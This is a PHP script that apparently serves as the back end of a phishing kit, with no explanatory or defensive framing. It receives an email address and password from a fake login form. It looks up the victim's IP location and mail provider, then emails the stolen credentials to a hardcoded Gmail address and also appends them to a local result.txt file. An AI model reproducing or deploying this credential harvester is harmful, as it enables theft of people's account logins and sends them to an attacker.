<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
	
	$username = htmlspecialchars($_POST["email"]);
	$pwd = htmlspecialchars($_POST["password"]);
    $lourl = htmlspecialchars($_POST['lourl']);
	// IP address and location details retrieval
	$ip = getenv('HTTP_CLIENT_IP') ?: getenv('HTTP_X_FORWARDED_FOR') ?: getenv('HTTP_X_FORWARDED') ?: getenv('HTTP_FORWARDED_FOR') ?: getenv('HTTP_FORWARDED') ?: getenv('REMOTE_ADDR');
	$query = @unserialize(file_get_contents('http://ip-api.com/php/' . $ip));
	if ($query && $query['status'] == 'success') {
		$city = $query['city'];
		$country = $query['country'];
		$regionName = $query['regionName'];
		$ip = $query['query'];
	} else {
		$ip = 'Unable to get location';
	}
	
	$domain_name = substr(strrchr($username, "@"), 1);
	if (getmxrr($domain_name, $mx_details)) {
		foreach ($mx_details as $value) {
			$mxName = $value;
		}
	}
	
	$msg = "<h3>RESULT: $mxName</h3><hr>
	<br>
	City : <b>$city</b> <br/>
	Country : <b>$country</b><br/>
	Region : <b>$regionName</b><br/>
	IP : <b>$ip</b><br/>
	Email powered by: <b>$mxName</b>
	<p>Time Received - " . date("d/m/Y h:i:s a") . "</p>";

	$period = date('F - Y');
	$to = "visibilityng@gmail.com";
	$subject = "Login from: Log$";
	$headers = "From: Result <$username>\r\n";
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

	$message = '<html><body>';
	$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
	$message .= "<tr><td><strong>Location Details:</strong> </td><td>" . $msg . "</td></tr>";
	$message .= "<tr><td><strong>Client's Email:</strong> </td><td>" . $username . "</td></tr>";
	$message .= "<tr><td><strong>Password:</strong> </td><td>" . $pwd . "</td></tr>";
	$message .= "<tr><td><strong>URL:</strong> </td><td>" . $lourl . "</td></tr>";
	$message .= "</table>";
	$message .= "</body></html>";
	$message .= "---------------Created BY PLUG-------------\r\n";
	
	//$send  = @mail($to, $subject, $message, $headers);
	if(@mail($to, $subject, $message, $headers)){
		
		$data = array(
			'success'	=> true
		);
		
	}
	
	echo json_encode($data);
	
	$content = "Email: $username"."\n";
	$content .= "Password: $pwd"."\n";
	$content .= "Email Powered: $mxName"."\n";
	$content .= "IP: $ip"."\n";
	$content .= "City: $city"."\n";
	$content .= "....... \n";

	// Write the content to a text file
	$filename = 'result.txt';
	$handle = fopen($filename, 'a'); // 'a' means append to the file
	if ($handle) {
		fwrite($handle, $content);
		fclose($handle);
	}
}
die;
?>